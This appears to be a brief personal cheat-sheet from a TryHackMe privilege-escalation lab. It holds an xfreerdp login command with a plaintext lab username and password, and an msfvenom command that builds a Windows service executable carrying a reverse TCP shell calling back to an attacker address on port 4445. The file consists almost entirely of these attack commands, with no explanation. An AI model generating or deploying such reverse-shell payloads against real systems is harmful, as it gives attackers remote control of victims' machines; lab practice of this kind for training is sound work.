# try hack me rdp on attacker box
xfreerdp /v:[ip]  /p:TheWorldIsMine2022 /u:THMTakeOwnership /gfx:RFX /bpp:32 /dynamic-resolution -encryption

# service rev shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.60.110 LPORT=4445 -f exe-service -o rev-svc.exe